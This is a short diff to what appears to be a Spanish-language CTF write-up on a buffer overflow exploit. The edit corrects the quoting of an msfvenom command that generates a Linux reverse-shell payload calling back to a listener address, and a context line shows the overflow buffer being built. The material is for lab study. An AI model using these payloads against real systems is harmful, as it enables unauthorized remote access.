@@ -225,7 +225,7 @@ buffer = "A"*272 + pushesp + "\x90"*20 + shell + "\x00"
 En la máquina del CTF se hará uso de una reverse shell en Linux que será necesario generar y modificar en el exploit.
 
 ```python
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.186 LPORT=9001 -f c -b '\x00 EXITFUNC=thread'
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.186 LPORT=9001 -f c -b '\x00' EXITFUNC=thread
 ```
 
 Una vez ejecutado, se puede observar que desde el netcat se recibe la shell de la máquina, dandonos acceso a la misma.
